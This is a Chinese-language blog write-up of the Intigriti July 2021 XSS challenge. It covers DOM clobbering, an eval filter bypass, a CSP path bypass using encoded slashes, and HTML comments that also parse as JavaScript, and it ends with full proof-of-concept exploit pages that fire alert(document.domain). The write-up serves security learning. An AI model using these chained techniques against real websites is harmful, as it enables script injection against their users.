---
title: Intigriti 七月份 XSS 挑戰：突破層層關卡
date: 2021-08-05
tags: [Security, Front-end]
author: huli
description: 從一題 XSS 的題目中突破層層關卡，學習各種前端相關知識
layout: zh-tw/layouts/post.njk
---

## 前言

<!-- summary -->
<!-- 從一題 XSS 的題目中突破層層關卡，學習各種前端相關知識 -->
<!-- summary -->

[Intigriti](https://www.intigriti.com/) 這個網站每個月都會有 XSS 挑戰，給你一週的時間去解一道 XSS 的題目，目標是成功執行 `alert(document.domain)`。

身為一個前端資安混血工程師，我每個月都有參加（但不一定有解出來），底下是前幾個月的筆記：

1. [解題心得：Intigriti's 0421 XSS challenge（上）](https://blog.huli.tw/2021/05/25/xss-challenge-by-intigriti-writeup/)
2. [Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼](https://blog.huli.tw/2021/06/07/xss-challenge-by-intigriti-writeup-may/)
3. [Intigriti 六月份 XSS 挑戰檢討](https://blog.huli.tw/2021/07/03/xss-challenge-intigriti-june-review/)

每個月的挑戰都相當有趣，我覺得難易度也掌握得不錯，沒有到超級無敵難，但也不會輕易到一下就被解開。而這個月的挑戰我也覺得很好玩，因此在解開之後寫了這篇心得跟大家分享，期待有越來越多人可以一起參與。

挑戰網址：https://challenge-0721.intigriti.io/

## 分析題目

仔細看一下會發現這次的挑戰其實比較複雜一點，因為有三個頁面跟一堆的 `postMessage` 還有 `onmessage`，要搞清楚他們的關係需要一些時間。

我看了一下之後因為懶得搞懂，所以決定從反方向開始解。如果是 XSS 題目，代表一定要有地方可以執行程式碼，通常都是 `eval` 或是 `innerHTML`，所以可以先找到這邊，再往回推該如何抵達。

接下來就來簡單看一下那三個頁面：

1. index.html
2. htmledit.php
3. console.php

### index.html

``` html
<div class="card-container">
 <div class="card-header-small">Your payloads:</div>
 <div class="card-content">
    <script>
       // redirect all htmledit messages to the console
       onmessage = e =>{
          if (e.data.fromIframe){
             frames[0].postMessage({cmd:"log",message:e.data.fromIframe}, '*');
          }
       }
       /*
       var DEV = true;
       var store = {
           users: {
             admin: {
                username: 'inti',
                password: 'griti'
             }, moderator: {
                username: 'root',
                password: 'toor'
             }, manager: {
                username: 'andrew',
                password: 'hunter2'
             },
          }
       }
       */
    </script>

    <div class="editor">
       <span id="bin">
          <a onclick="frames[0].postMessage({cmd:'clear'},'*')">🗑️</a>
       </span>
       <iframe class=console src="./console.php"></iframe>
       <iframe class=codeFrame src="./htmledit.php?code=<img src=x>"></iframe>
       <textarea oninput="this.previousElementSibling.src='./htmledit.php?code='+escape(this.value)"><img src=x></textarea>
    </div>
 </div>
</div>
```

除了被註解的那一段變數之外，看起來沒什麼特別的。

### htmledit.php

``` html
<!-- &lt;img src=x&gt; -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Native HTML editor</title>
    <script nonce="d8f00e6635e69bafbf1210ff32f96bdb">
        window.addEventListener('error', function(e){
            let obj = {type:'err'};
            if (e.message){
                obj.text = e.message;
            } else {
                obj.text = `Exception called on ${e.target.outerHTML}`;
            }
            top.postMessage({fromIframe:obj}, '*');
        }, true);
        onmessage=(e)=>{
            top.postMessage({fromIframe:e.data}, '*')
        }
    </script>
</head>
<body>
    <img src=x></body>
</html>
<!-- /* Page loaded in 0.000024 seconds */ -->
```

這個頁面會直接把 query string code 的內容顯示在頁面上，然後開頭還有一段神秘的註解，是把 code encode 之後的內容。但儘管顯示在頁面上卻沒辦法執行，因為有著嚴格的 CSP：`script-src 'nonce-...';frame-src https:;object-src 'none';base-uri 'none';`

不過 CSP 裡面特別開了 frame-src，我看到這邊的時候想說：「這可能是個提示，提示我們要用 iframe」

### console.php

``` html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <script nonce="c4936ad76292ee7100ecb9d72054e71f">
        name = 'Console'
        document.title = name;
        if (top === window){
            document.head.parentNode.remove(); // hide code if not on iframe
        }
    </script>
    <style>
        body, ul {
            margin:0;
            padding:0;
        }

        ul#console {
            background: lightyellow;
            list-style-type: none;
            font-family: 'Roboto Mono', monospace;
            font-size: 14px;
            line-height: 25px;
        }

        ul#console li {
            border-bottom: solid 1px #80808038;
            padding-left: 5px;

        }
    </style>
</head>
<body>
    <ul id="console"></ul>
    <script nonce="c4936ad76292ee7100ecb9d72054e71f">
        let a = (s) => s.anchor(s);
        let s = (s) => s.normalize('NFC');
        let u = (s) => unescape(s);
        let t = (s) => s.toString(0x16);
        let parse = (e) => (typeof e === 'string') ? s(e) : JSON.stringify(e, null, 4); // make object look like string
        let log = (prefix, data, type='info', safe=false) => {
            let line = document.createElement("li");
            let prefix_tag = document.createElement("span");
            let text_tag = document.createElement("span");
            switch (type){
                case 'info':{
                    line.style.backgroundColor = 'lightcyan';
                    break;
                }
                case 'success':{
                    line.style.backgroundColor = 'lightgreen';
                    break;
                }
                case 'warn':{
                    line.style.backgroundColor = 'lightyellow';
                    break;
                }
                case 'err':{
                    line.style.backgroundColor = 'lightpink';
                    break;
                } 
                default:{
                    line.style.backgroundColor = 'lightcyan';
                }
            }
            
            data = parse(data);
            if (!safe){
                data = data.replace(/</g, '&lt;');
            }

            prefix_tag.innerHTML = prefix;
            text_tag.innerHTML = data;

            line.appendChild(prefix_tag);
            line.appendChild(text_tag);
            document.querySelector('#console').appendChild(line);
        } 

        log('Connection status: ', window.navigator.onLine?"Online":"Offline")
        onmessage = e => {
            switch (e.data.cmd) {
                case "log": {
                    log("[log]: ", e.data.message.text, type=e.data.message.type);
                    break;
                }
                case "anchor": {
                    log("[anchor]: ", s(a(u(e.data.message))), type='info')
                    break;
                }
                case "clear": {
                    document.querySelector('#console').innerHTML = "";
                    break;
                }
                default: {
                    log("[???]: ", `Wrong command received: "${e.data.cmd}"`)
                }
            }
        }
    </script>
    <script nonce="c4936ad76292ee7100ecb9d72054e71f">
        try {
            if (!top.DEV)
                throw new Error('Production build!');
                
            let checkCredentials = (username, password) => {
                try{
                    let users = top.store.users;
                    let access = [users.admin, users.moderator, users.manager];
                    if (!users || !password) return false;
                    for (x of access) {
                        if (x.username === username && x.password === password)
                            return true
                    }
                } catch {
                    return false
                }
                return false
            }

            let _onmessage = onmessage;
            onmessage = e => {
                let m = e.data;
                if (!m.credentials || !checkCredentials(m.credentials.username, m.credentials.password)) {
                    return; // do nothing if unauthorized
                }
            
                switch(m.cmd){
                    case "ping": { // check the connection
                        e.source.postMessage({message:'pong'},'*');
                        break;
                    }
                    case "logv": { // display variable's value by its name
                        log("[logv]: ", window[m.message], safe=false, type='info'); 
                        break;
                    }
                    case "compare": { // compare variable's value to a given one
                        log("[compare]: ", (window[m.message.variable] === m.message.value), safe=true, type='info'); 
                        break;
                    }
                    case "reassign": { // change variable's value
                        let o = m.message;
                        try {
                            let RegExp = /^[s-zA-Z-+0-9]+$/;
                            if (!RegExp.test(o.a) || !RegExp.test(o.b)) {
                                throw new Error('Invalid input given!');
                            }
                            eval(`${o.a}=${o.b}`);
                            log("[reassign]: ", `Value of "${o.a}" was changed to "${o.b}"`, type='warn');
                        } catch (err) {
                            log("[reassign]: ", `Error changing value (${err.message})`, type='err');
                        }
                        break;
                    }
                    default: {
                        _onmessage(e); // keep default functions
                    }
                }
            }
        } catch {
            // hide this script on production
            document.currentScript.remove();
        }
    </script>
    <script src="./analytics/main.js?t=1627610836"></script>
</body>
</html>
```

這個頁面的程式碼比其他兩頁多很多，而且可以找到一些我們需要的東西，比如說 `eval`：

``` js
let _onmessage = onmessage;
onmessage = e => {
    let m = e.data;
    if (!m.credentials || !checkCredentials(m.credentials.username, m.credentials.password)) {
        return; // do nothing if unauthorized
    }

    switch(m.cmd){
        // ...
        case "reassign": { // change variable's value
            let o = m.message;
            try {
                let RegExp = /^[s-zA-Z-+0-9]+$/;
                if (!RegExp.test(o.a) || !RegExp.test(o.b)) {
                    throw new Error('Invalid input given!');
                }
                eval(`${o.a}=${o.b}`);
                log("[reassign]: ", `Value of "${o.a}" was changed to "${o.b}"`, type='warn');
            } catch (err) {
                log("[reassign]: ", `Error changing value (${err.message})`, type='err');
            }
            break;
        }
        default: {
            _onmessage(e); // keep default functions
        }
    }
}
```

但這邊的 `eval` 似乎沒辦法讓我們直接執行想要的程式碼，因為規範滿嚴格的（大寫字母、部分小寫字母、數字跟 +-），可能是有其他用途。

另外一個有機會的地方是這裡：

``` js
let log = (prefix, data, type='info', safe=false) => {
    let line = document.createElement("li");
    let prefix_tag = document.createElement("span");
    let text_tag = document.createElement("span");
    switch (type){
        // not important
    }
    
    data = parse(data);
    if (!safe){
        data = data.replace(/</g, '&lt;');
    }

    prefix_tag.innerHTML = prefix;
    text_tag.innerHTML = data;

    line.appendChild(prefix_tag);
    line.appendChild(text_tag);
    document.querySelector('#console').appendChild(line);
} 
```

如果 safe 是 true 的話，那 data 就不會被 escape，就可以插入任意的 HTML，達成 XSS。

而這邊值得注意的是函式的參數那一段：`let log = (prefix, data, type='info', safe=false)`，這點值得特別解釋一下。

在有些程式語言裡面，支援這種參數的命名，在呼叫 function 的時候可以用名稱來傳入參數，例如說：`log(prefix='a', safe=true)`，就傳入對應到的參數。

但是在 JS 裡面並沒有這種東西，參數的對應完全是靠「順序」來決定的。舉例來說，`log("[logv]: ", window[m.message], safe=false, type='info');` 對應到的參數其實是：

1. prefix: `"[logv]: "`
2. data: `window[m.message]`
3. type: `false`
4. safe: `'info'`

是靠順序而不是靠名稱，這也是許多新手會被搞混的地方。

總之呢，就讓我們從 `log` 這個函式開始往回找吧，要執行到這一段，必須要 post message 到這個 window，然後符合一些條件。

## 第一關：成功 post message

這個 console.php 的頁面有一些條件限制，如果沒有符合這些條件就沒辦法執行到 log function 去。

首先這個頁面必須被 embed 在 iframe 裡面：

``` js
name = 'Console'
document.title = name;
if (top === window){
    document.head.parentNode.remove(); // hide code if not on iframe
}
```

再來還有這些檢查要通過：

``` js
try {
    if (!top.DEV)
        throw new Error('Production build!');
        
    let checkCredentials = (username, password) => {
        try{
            let users = top.store.users;
            let access = [users.admin, users.moderator, users.manager];
            if (!users || !password) return false;
            for (x of access) {
                if (x.username === username && x.password === password)
                    return true
            }
        } catch {
            return false
        }
        return false
    }

    let _onmessage = onmessage;
    onmessage = e => {
        let m = e.data;
        if (!m.credentials || !checkCredentials(m.credentials.username, m.credentials.password)) {
            return; // do nothing if unauthorized
        }
        // ...
    }
} catch {
    // hide this script on production
    document.currentScript.remove();
}
```

`top.DEV` 要是 truthy，然後傳進去的 credentials 要符合 `top.store.users.admin.username` 還有 `top.store.users.admin.password`

這樣我應該自己寫一個頁面，然後設置一下這些全域變數就好了？

沒辦法，因為有 Same Origin Policy 的存在，你只能存取同源頁面下的 window 內容，所以如果是自己寫一個頁面然後把 console.php embed 在裡面的話，在存取 `top.DEV` 時就會出錯。

所以我們需要有一個同源的頁面可以讓我們設置一些東西。而這個頁面，顯然就是可以讓我們插入一些 HTML 的 htmledit.php 了。

## DOM clobbering

該怎麼在不能執行 JS 的情況下設置全域變數呢？沒錯，就是 DOM clobbering。

舉例來說，如果你有個 `<div id="a"></div>`，在 JS 裡面你就可以用 `window.a` 或是 `a` 去存取到這個 div 的 DOM。

如果你對 DOM clobbering 不熟的話可以參考我之前寫過的[淺談 DOM Clobbering 的原理及應用](https://blog.huli.tw/2021/01/23/dom-clobbering/)，或是這一篇也寫得很好：[使用 Dom Clobbering 扩展 XSS](https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/)

如果要達成多層的變數設置，就要利用到 `iframe` 搭配 `srcdoc`：

``` html
<a id="DEV"></a>
<iframe name="store" srcdoc='
    <a id="users"></a>
    <a id="users" name="admin" href="ftp://a:a@a"></a>
    '>
</iframe>
<iframe name="iframeConsole" src="https://challenge-0721.intigriti.io/console.php"></iframe>
```

這邊還有利用到一個特性是 a 元素的 username 屬性會是 href 屬性裡 URL 的 username。

這樣設置的話，`top.DEV` 就會是 `a id="DEV"></a>` 這個 DOM，而 `store.users` 就會是 HTMLCollection，`store.users.admin` 是那個 a，`store.users.admin.username` 則會是 href 裡面的 username，也就是 `a`，而密碼也是一樣的。

綜合以上所述，我可以自己寫一個 HTML 然後用 `window.open` 去開啟 htmledit.php 然後把上面的內容帶進去：

``` html
<!DOCTYPE html>

<html lang="en">
<head>
  <meta charset="utf-8">
  <title>XSS POC</title>  
</head>
<body>
  <script>
    const htmlUrl = 'https://challenge-0721.intigriti.io/htmledit.php?code='
    const payload = `
      <a id="DEV"></a>
      <iframe name="store" srcdoc='
        <a id="users"></a>
        <a id="users" name="admin" href="ftp://a:a@a"></a>
      '></iframe>
      <iframe name="iframeConsole" src="https://challenge-0721.intigriti.io/console.php"></iframe>
    `

    var win = window.open(htmlUrl + encodeURIComponent(payload))

    // wait unitl window loaded
    setTimeout(() => {
      console.log('go')
      const credentials = {
        username: 'a',
        password: 'a'
      }
      win.frames[1].postMessage({
        cmd: 'test',
        credentials
      }, '*')
    }, 5000)

  </script>
</body>
</html>
```

如此一來，我就可以用 postMessage 送訊息進去了。

雖然花了一番功夫，但這才只是開始而已。

## 第二關：讓 safe 變成 true

safe 要是 true，這樣呼叫 log 的時候才不會把 `<` escape，要讓 safe 是 true 的話，要找到有傳入四個參數的呼叫，因為第四個會是 safe 的值：

``` js
case "logv": { // display variable's value by its name
    log("[logv]: ", window[m.message], safe=false, type='info'); 
    break;
}
case "compare": { // compare variable's value to a given one
    log("[compare]: ", (window[m.message.variable] === m.message.value), safe=true, type='info'); 
    break;
}
```

`log("[logv]: ", window[m.message], safe=false, type='info')` 這個我在找的 function call，而這之中第二個參數會是 `window[m.message]`，也就是說可以把任一全域變數當作 data 傳進去，可是要傳什麼呢？

## 第三關：找到可以傳入的變數

我在這邊卡得滿久的，因為我想不太到這邊可以傳什麼。以前有一招是可以傳 name，但是這個網頁已經自己設定 name 了所以沒辦法。另一招是用 URL 去傳就可以把東西放在 location 上面，但 `log` 裡面會檢查 `data` 是不是字串，不是的話要先經過 `JSON.stringify`，會把內容encode。

卡很久的我只好不斷重複看著程式碼，看能不能找出什麼新東西，結果還真的找到了。下面這段 code 有一個新手常見問題，你有看出來嗎？

``` js
let checkCredentials = (username, password) => {
    try{
        let users = top.store.users;
        let access = [users.admin, users.moderator, users.manager];
        if (!users || !password) return false;
        for (x of access) {
            if (x.username === username && x.password === password)
                return true
        }
    } catch {
        return false
    }
    return false
}
```

這個問題就出在 `for (x of access) {`，x 忘了宣告，所以預設就會變成全域變數。在這邊的話，`x` 會是 `top.store.users.admin`，也就是我們自己設置的那個 `<a>`。

## 第四關：繞過型態檢查

既然我們有了這個 x，就可以把它用 logv 這個 command 傳入 log function，然後因為 safe 會是 true，所以就可以直接把 x 的內容用 innerHTML 顯示出來。

如果你把一個 a 元素變成字串，會得到 a.href 的內容，所以我們可以把我們的 payload 放在 href 裡面。

但是，`log` 裡面會檢查 data 的型態，而 `a` 不是字串所以過不了檢查，這該怎麼辦呢？

這時候我重新看了一遍程式碼，發現了這個指令：

``` js
case "reassign": { // change variable's value
    let o = m.message;
    try {
        let RegExp = /^[s-zA-Z-+0-9]+$/;
        if (!RegExp.test(o.a) || !RegExp.test(o.b)) {
            throw new Error('Invalid input given!');
        }
        eval(`${o.a}=${o.b}`);
        log("[reassign]: ", `Value of "${o.a}" was changed to "${o.b}"`, type='warn');
    } catch (err) {
        log("[reassign]: ", `Error changing value (${err.message})`, type='err');
    }
    break;
}
```

我可以這樣做：

``` js
win.frames[1].postMessage({
    cmd: 'reassign',
    message:{
      a: 'Z',
      b: 'x+1'
    },
    credentials
}, '*')
```

這就等於是 `Z=x+1`，然後 `x+1` 的時候會因為自動轉型的關係變成字串，這樣一來 Z 就會是一個含有我們 payload 的字串了。

## 第五關：繞過 encode

雖然我們現在可以傳字串進去了，但還有一件事情要搞定，那就是因為 href 裡面的東西是 URL 所以會被 encode，例如說 `<` 會變成 `%3C`：

``` js
var a = document.createElement('a')
a.setAttribute('href', 'ftp://a:a@a#<img src=x onload=alert(1)>')
console.log(a+1)
// ftp://a:a@a/#%3Cimg%20src=x%20onload=alert(1)%3E1
```

這又要怎麼辦呢？

在 `log` 裡面有一行是 `data = parse(data)`，而 parse 的程式碼是這樣的：

``` js
let parse = (e) => (typeof e === 'string') ? s(e) : JSON.stringify(e, null, 4); // make object look like string
```

如果 e 是字串，那就回傳 `s(e)`，而這個 s 是另外一個函式。

當初在看程式碼的時候，我看到 reassign 那邊對於 eval 的檢查時，就注意到了它的規則：`RegExp = /^[s-zA-Z-+0-9]+$/;`，還有底下這四個函式：

``` js
let a = (s) => s.anchor(s);
let s = (s) => s.normalize('NFC');
let u = (s) => unescape(s);
let t = (s) => s.toString(0x16);
```

其中 s, u 跟 t 這三個字元都是允許的，也就是說，可以透過 reassign 這個指令把他們互換！我們可以把 `s` 換成 `u`，這樣 data 就會被 unescape 了！

所以最後的程式碼會長這樣：

``` js
const htmlUrl = 'https://challenge-0721.intigriti.io/htmledit.php?code='
const insertPayload=`<img src=x onerror=alert(1)>`
const payload = `
  <a id="DEV"></a>
  <iframe name="store" srcdoc='
    <a id="users"></a>
    <a id="users" name="admin" href="ftp://a:a@a#${escape(insertPayload)}"></a>
  '></iframe>
  <iframe name="iframeConsole" src="https://challenge-0721.intigriti.io/console.php"></iframe>
`

var win = window.open(htmlUrl + encodeURIComponent(payload))

// 等待 window 載入完成
setTimeout(() => {
  console.log('go')
  const credentials = {
    username: 'a',
    password: 'a'
  }
  // s=u
  win.frames[1].postMessage({
    cmd: 'reassign',
    message:{
      a: 's',
      b: 'u'
    },
    credentials
  }, '*')

  // Z=x+1 so Z = x.href + 1
  win.frames[1].postMessage({
    cmd: 'reassign',
    message:{
      a: 'Z',
      b: 'x+1'
    },
    credentials
  }, '*')

  // log window[Z]
  win.frames[1].postMessage({
    cmd: 'logv',
    message: 'Z',
    credentials
  }, '*')
}, 5000)
```

所以 data 會是 `ftp://a:a@a#<img src=x onerror=alert(1)>`，然後被設定到 HTML 上面，觸發 XSS！

不，事情沒那麼順利...我忘記有 CSP 了。

## 第六關：繞過 CSP

雖然我可以插入任意 HTML，但很遺憾地這個網頁也有 CSP：

```
script-src 
'nonce-xxx' 
https://challenge-0721.intigriti.io/analytics/ 
'unsafe-eval';

frame-src https:;

object-src 'none';base-uri 'none';
```

因為沒有 `unsafe-inline`，所以我們之前的 payload 是無效的。而這一段 CSP 當中，`https://challenge-0721.intigriti.io/analytics/` 顯然是個很可疑的路徑。

這個頁面其實有引入一個 https://challenge-0721.intigriti.io/analytics/main.js 的檔案，但裡面沒有東西，只有一些註解而已。

其實看到這邊的時候我就知道要怎麼做了，因為我之前有學到一個繞過 CSP 的技巧，利用`%2F`（編碼過後的 `/`）以及前後端對於 URL 解析的不一致。

以 `https://challenge-0721.intigriti.io/analytics/..%2fhtmledit.php` 為例，對瀏覽器來說，這個 URL 是在 `/analytics` 底下，所以可以通過 CSP 的檢查。

但是對伺服器來說，這一段是 `https://challenge-0721.intigriti.io/analytics/../htmledit.php` 也就是 `https://challenge-0721.intigriti.io/htmledit.php`

所以我們成功繞過了 CSP，載入不同路徑的檔案！

因此現在的目標就變成我們要找一個檔案裡面可以讓我們放 JS 程式碼。看來看去都只有 htmledit.php 能用，但它不是一個 HTML 嗎？

## 第七關：構造 JS 程式碼

如果你還記得的話，這個頁面的開頭有一段是 HTML 的註解：

``` html
<!-- &lt;img src=x&gt; -->
....
```

而在一些情況下，其實這語法也是 JS 的註解。不是我說的，是規格書說的：

![ECMAScript spec](/img/posts/huli/xss-0721/spec.png)

換句話說呢，我們可以利用這點，做出一個看起來像 HTML，但實際上也是合法 JS 的檔案！

我最後做出來的 URL 是這樣：`https://challenge-0721.intigriti.io/htmledit.php?code=1;%0atop.alert(document.domain);/*`

產生的 HTML 長這樣：

``` html
<!-- 1; 這邊都是註解
top.alert(document.domain);/* --> 這之後也都是註解了
<!DOCTYPE html>
<html lang="en">
<head>
...
```

第一行是註解，`/*` 之後也都是註解，所以這一整段其實就是 `top.alert(document.domain);` 的意思。

不過這邊可以注意的是 htmledit.php 的 content type 不會變，依然還是 `text/html`，之所以可以把它當作 JS 引入，是因為同源的關係。如果你是把一個不同源的 HTML 當作 JS 引入，就會被 [CORB](https://www.chromium.org/Home/chromium-security/corb-for-developers) 給擋下來。

做到這邊，我們就可以讓 data 是 `<script src="https://challenge-0721.intigriti.io/htmledit.php?code=1;%0atop.alert(document.domain);/*"></script>`

這樣就會執行到 `text_tag.innerHTML = data`，成功在頁面上放進去 script 還繞過了 CSP，完美！

但可惜的是，還差一點點...

## 第八關：執行動態插入的 script

就在我以為要過關的時候，卻發現我的 script 怎樣都不會執行。後來用[關鍵字](https://stackoverflow.com/questions/1197575/can-scripts-be-inserted-with-innerhtml)去查，才發現如果是用 innerHTML 插入 script 標籤，插入之後是不會去執行的。

我試著用 `innerhtml import script` 或是 `innerhtml script run` 之類的關鍵字去找解法但都沒找到。

最後，我是突然想到可以試試看 `<iframe srcdoc="...">`，有種死馬當活馬醫的感覺，反正就試試看這樣行不行，沒有損失。

結果沒想到就可以了。直接 assign 給 innerHTML 不行，但如果內容是：`<iframe srcdoc="<script src='...'></script>"` 就可以，就會直接載入 script。

## 最後解法

最後再補充一件事情，我要送出答案之前發現我的答案在 Firefox 上面不能跑，原因是這段程式碼：

``` html
<a id="users"></a>
<a id="users" name="admin" href="a"></a>
```

在 Chrome 上 `window.users` 會是 HTMLCollection，但在 Firefox 上面只會拿到一個 a 元素，而 `window.users.admin` 也就是 undefined。

但這問題不大，只要多一層 iframe 就可以搞定：

``` html
<iframe name="store" srcdoc="
  <iframe srcdoc='<a id=admin href=ftp://a:a@a#></a>' name=users>
">
</iframe>
```

我最後的答案長這樣：

``` html
<!DOCTYPE html>

<html lang="en">
<head>
  <meta charset="utf-8">
  <title>XSS POC</title>  
</head>

<body>
  <script>
    const htmlUrl = 'https://challenge-0721.intigriti.io/htmledit.php?code='
    const exploitSrc = '/analytics/..%2fhtmledit.php?code=1;%0atop.alert(document.domain);/*'
    const insertPayload=`<iframe srcdoc="<script src=${exploitSrc}><\/script>">`
    const payload = `
      <a id="DEV"></a>
      <iframe name="store" srcdoc="
        <iframe srcdoc='<a id=admin href=ftp://a:a@a#${escape(insertPayload)}></a>' name=users>
      ">
      </iframe>
      <iframe name="iframeConsole" src="https://challenge-0721.intigriti.io/console.php"></iframe>
    `
    var win = window.open(htmlUrl + encodeURIComponent(payload))

    // wait for 3s to let window loaded
    setTimeout(() => {
      const credentials = {
        username: 'a',
        password: 'a'
      }
      win.frames[1].postMessage({
        cmd: 'reassign',
        message:{
          a: 's',
          b: 'u'
        },
        credentials
      }, '*')

      win.frames[1].postMessage({
        cmd: 'reassign',
        message:{
          a: 'Z',
          b: 'x+1'
        },
        credentials
      }, '*')

      win.frames[1].postMessage({
        cmd: 'logv',
        message: 'Z',
        credentials
      }, '*')
    }, 3000)

  </script>
</body>
</html>

```

## 其他解法

我的方法是新開一個 window 來 post message，但其實也可以把自己作為 iframe，讓 htmledit.php embed，這樣的話其實也可以用 top.postMessage 去傳送訊息。

「把自己 embed 在其他網頁中」這個是我很常忘記的一個方法。

另一個非預期的解法也很神奇，是根據這一段：

``` js
case "log": {
  log("[log]: ", e.data.message.text, type=e.data.message.type);
  break;
}
```

這一段的重點是 `type=e.data.message.type`，會設置一個 global variable 叫做 type，因此其實可以透過這邊傳入任意 payload，再去呼叫 logv 就好。就省去了把 payload 放在 a 上面那一大堆要處理的事情。

## 總結

我滿喜歡這次的這個題目，因為有種層層關卡的感覺，一關一關慢慢過，每當我以為要破關的時候，就又卡住了，直到最後才把所有關卡都解完，成功執行 XSS。

從這個挑戰中，可以學習到的前端知識是：

1. DOM clobbering
2. JS 的註解不是只有 // 跟 /* */
3. CSP 針對 path 的繞過
4. 用 innerHTML 新增的 script 不會執行
5. 針對上一點，可以用 iframe srcdoc 來繞過（但一般狀況下應該新增一個 script tag 然後 append）

從這個題目中可以學習或是複習滿多技巧的，CTF 跟這種挑戰有趣的點就在這邊，雖然說每樣東西拆開來可能都知道，但要怎麼精心串起來，是很考驗經驗跟功力的。

如果對 XSS 挑戰有興趣，可以關注 [Intigriti](https://twitter.com/intigriti) 並且等待下一次的挑戰。

